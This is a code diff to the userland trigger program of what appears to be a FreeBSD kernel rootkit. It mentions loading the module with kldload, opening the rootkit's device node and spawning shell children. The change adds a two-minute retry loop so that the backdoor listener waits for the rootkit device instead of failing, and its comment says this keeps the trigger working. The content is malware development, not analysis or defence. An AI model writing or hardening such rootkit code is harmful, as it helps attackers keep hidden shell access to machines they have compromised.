@@ -19,7 +19,19 @@ int main(void) {
     /* Prevent terminated shell children from becoming zombies */
     signal(SIGCHLD, SIG_IGN);
 
-    int dev_fd = open("/dev/" rootkit_DEV_NAME, O_RDWR);
+    /*
+     * The device only exists once the module is loaded, and install compiles
+     * this binary before it kldloads. Wait for it instead of exiting on the
+     * first failure: a listener that gave up here is the difference between a
+     * working trigger and one that silently does nothing.
+     */
+    int dev_fd = -1;
+    for (int i = 0; i < 120; i++) {
+        dev_fd = open("/dev/" rootkit_DEV_NAME, O_RDWR);
+        if (dev_fd >= 0)
+            break;
+        sleep(1);
+    }
     if (dev_fd < 0) {
         perror("open /dev/" rootkit_DEV_NAME);
         return 1;
